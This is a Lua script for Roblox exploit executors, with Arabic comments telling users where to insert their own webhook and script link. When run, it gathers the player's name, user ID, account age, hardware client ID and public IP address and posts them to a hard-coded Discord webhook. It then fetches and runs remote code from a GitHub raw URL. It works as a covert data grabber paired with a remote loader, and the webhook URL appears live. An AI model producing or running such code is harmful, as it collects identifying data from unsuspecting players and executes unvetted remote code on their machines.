local webhook = "https://discord.com/api/webhooks/1228210387376275518/5WcZRn73RNl7fHjaZMYUkSTyuuTqfziSx2UIF4Ht9svM1ClbUzjRzmr4P1R1fMOdl5Lc" -- حط الويب هوك حقك هناً

-- Define the PlaceId variable
local PlaceId = game.PlaceId

-- Get the game name and game URL

local gameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name

local gameUrl = "https://www.roblox.com/games/" .. PlaceId

local profileUrl = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile"
local playerCount = #game:GetService("Players"):GetPlayers()

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local hasPremium = player.MembershipType == Enum.MembershipType.Premium
local time = os.time()
local date = os.date("*t", time)

local hour = math.floor(date.hour)
local min = math.floor(date.min)
local sec = math.floor(date.sec)



local ip = game:HttpGet("https://api.ipify.org")


local data = {
    ["content"] = "",
    ["username"] = "Mars Webhook", -- حط اسم الويب هوك الي تبيه هناً
    ["embeds"] = {
        {
            ["title"] = "",
            ["description"] = ""
            .. "**Player Name:**  ```" .. game:GetService("Players").LocalPlayer.Name .. " ```\n"
            .. "**Player ID:** ```" .. game:GetService("Players").LocalPlayer.UserId .. "```\n"
			.. "**Player URL:** ```" .. profileUrl .. "```\n"
            .. "**Game Name:** ```" .. gameName .. "```\n"
            .. "**Game URL:** ```" .. gameUrl .. "```\n"
		    .. "**Server JobId :** ```" .. game.JobId .. "```\n"
            .. "**Server Number players online :** ```" .. playerCount .. "```\n"
			.. "**Account Age :** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "``` \n" 
            .. "**IP :** ```" .. ip .. " / https://whatismyipaddress.com/ip/".. ip .. "```\n"
            .. "**HWID  :** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "``` \n" 
            .. "**Name Hack  :** ```" .. identifyexecutor() .. "``` \n" 
            .. "**Player Premium :** " .. if hasPremium then "```yes```" else "```no```"  .. "\n"
            .. date.day .. "/" .. date.month .. "/" .. date.year .. " " .. hour .. ":" .. min .. ":" .. sec .. "" .. "\n"
        }
    }
}

-- Send the data to the webhook
local HS = game:GetService("HttpService"):JSONEncode(data)
local headers = {
    ["content-type"] = "application/json"
}

local data2 = {
    Url = webhook,
    Body = HS,
    Method = "POST",
    Headers = headers
}

request(data2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Danialdev001/MarsScrips/main/MarsHub.lua"))() -- حط الرابط حق السكربت حقك 
